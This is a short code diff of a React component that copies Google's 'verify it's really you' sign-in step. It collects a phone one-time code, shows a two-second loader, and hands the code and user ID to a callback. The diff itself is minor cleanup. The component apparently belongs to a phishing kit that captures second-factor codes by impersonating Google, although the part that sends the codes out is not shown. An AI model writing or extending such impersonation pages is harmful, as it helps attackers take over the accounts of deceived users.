@@ -2,8 +2,6 @@ import React, { useState } from 'react'
 
 const OtpStep2 = ({email, userId, onComplete}) => {
     const [phoneOtp2, setphoneOtp2] = useState("");
-      const [loading, setLoading] = useState(false);
-      const [error, setError] = useState("");
         const [showLoader, setShowLoader] = useState(false);
       
     
@@ -17,7 +15,7 @@ const OtpStep2 = ({email, userId, onComplete}) => {
         setShowLoader(true);
     
       if (onComplete) {
-        const timer = setTimeout(() => {
+         setTimeout(() => {
              onComplete(userId, phoneOtp2.trim());
           setShowLoader(false);
         }, 2000);
@@ -71,7 +69,7 @@ const OtpStep2 = ({email, userId, onComplete}) => {
           </h1>
           <p className="signin-subtitle">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</p>
 
-          <div className="account-pill">
+          <div onClick={handleBack} className="account-pill">
             <span className="account-icon">👤</span>
             <span className="account-email">
               {email}
